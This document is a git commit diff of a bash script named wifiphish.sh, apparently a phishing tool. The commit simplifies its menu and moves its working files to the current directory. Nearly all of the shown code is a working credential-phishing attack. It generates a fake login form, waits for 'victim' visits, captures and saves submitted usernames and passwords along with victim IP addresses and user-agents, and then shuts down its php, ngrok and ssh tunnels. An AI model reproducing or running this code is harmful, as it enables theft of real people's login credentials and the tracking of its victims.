401f204f9194a31938223d37ab9a2b227278a704
hack4peace <90603785+official-hack4peace@users.noreply.github.com>
2022-02-23 22:03:01 +0530

    Update wifiphish.sh

--- wifiphish.sh
+++ wifiphish.sh
@@ -12,8 +12,8 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Wifi\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m \n"                                
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Wifi\e[0m"                                
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m"
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
@@ -79,37 +79,37 @@ pass_text="${pass_text:-${default_pass_text}}"
 read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
-echo "<!DOCTYPE html>" > sites/create/login.html
-echo "<html>" >> sites/create/login.html
-echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
+echo "<!DOCTYPE html>" > login.html
+echo "<html>" >> login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> login.html
 IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> login.html
 IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> login.html
 IFS=$'\n'
-printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+printf '<input type="text" name="username" length=64>\n' >> login.html
 IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+printf '<br><label>%s: </label>' $pass_text >> login.html
 IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+printf '<input type="password" name="password" length=64><br><br>\n' >> login.html
 IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
-printf '</center>' >> sites/create/login.html
-printf '<body>\n' >> sites/create/login.html
-printf '</html>\n' >> sites/create/login.html
+printf '<input value="%s" type="submit"></form>\n' $sub_text >> login.html
+printf '</center>' >> login.html
+printf '<body>\n' >> login.html
+printf '</html>\n' >> login.html
 
 
 }
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+cat usernames.txt >> saved.usernames.txt
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
@@ -125,7 +125,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e "usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
@@ -137,14 +137,14 @@ done
 }
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+touch saved.usernames.txt
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+cat ip.txt >> saved.ip.txt
 
 
 if [[ -e iptracker.log ]]; then
@@ -246,12 +246,12 @@ checkfound
 }
 
 startx() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e ip.txt ]]; then
+rm -rf ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+if [[ -e usernames.txt ]]; then
+rm -rf usernames.txt
 
 fi
 
@@ -267,12 +267,12 @@ serverx
 ##
 
 start() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e ip.txt ]]; then
+rm -rf ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+if [[ -e usernames.txt ]]; then
+rm -rf usernames.txt
 
 fi
 
@@ -361,16 +361,16 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e
 while [ true ]; do
 
 
-if [[ -e "sites/$server/ip.txt" ]]; then
+if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
-rm -rf sites/$server/ip.txt
+rm -rf ip.txt
 fi
 sleep 0.5
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e "usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf sites/$server/usernames.txt
+rm -rf usernames.txt
 fi
 sleep 0.5
 done 
